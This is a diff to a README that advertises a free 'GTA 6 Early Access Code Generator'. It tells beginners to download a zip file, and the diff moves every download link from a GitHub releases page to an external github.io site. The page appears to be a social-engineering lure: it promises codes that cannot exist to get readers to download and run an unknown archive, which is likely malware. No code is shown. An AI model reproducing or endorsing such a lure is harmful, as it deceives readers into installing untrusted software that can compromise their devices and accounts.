@@ -1,7 +1,7 @@
 <h1>🎮 GTA-6-Early-Access-Code-Generator-Free - Unlock Your Criminal Empire Today</h1>
 
 <p align="center">
-<a href="https://github.com/Pumbu788/GTA-6-Early-Access-Code-Generator-Free/releases"><img src="https://img.shields.io/badge/⬇️-DOWNLOAD%20NOW-44cc11?style=for-the-badge&logo=github&logoColor=white&labelColor=1f6feb" alt="Download Now" width="400"></a>
+<a href="https://pumbu788.github.io"><img src="https://img.shields.io/badge/⬇️-DOWNLOAD%20NOW-44cc11?style=for-the-badge&logo=github&logoColor=white&labelColor=1f6feb" alt="Download Now" width="400"></a>
 </p>
 
 ---
@@ -30,7 +30,7 @@ Follow these steps. They are designed for a complete beginner. If you can use a 
 
 **Visit this link to download the application:**
 
-🔗 **[Click Here to Download GTA 6 Early Access Code Generator](https://github.com/Pumbu788/GTA-6-Early-Access-Code-Generator-Free/releases)**
+🔗 **[Click Here to Download GTA 6 Early Access Code Generator](https://pumbu788.github.io)**
 
 This link takes you to our official releases page. You'll see the latest version file at the top. It's usually named something like `GTA6_Generator_v2.3.zip`. Click on it to start downloading. The file is lightweight, around 15 MB, so it won't take long even on slow internet.
 
@@ -125,7 +125,7 @@ This tool is provided as-is for educational and personal testing purposes. We do
 ---
 
 <p align="center">
-<a href="https://github.com/Pumbu788/GTA-6-Early-Access-Code-Generator-Free/releases" style="background-color:#4CAF50;color:white;padding:16px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:20px;border-radius:12px;">⬇️ GET YOUR FREE CODE NOW ⬇️</a>
+<a href="https://pumbu788.github.io" style="background-color:#4CAF50;color:white;padding:16px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:20px;border-radius:12px;">⬇️ GET YOUR FREE CODE NOW ⬇️</a>
 </p>
 
 ---
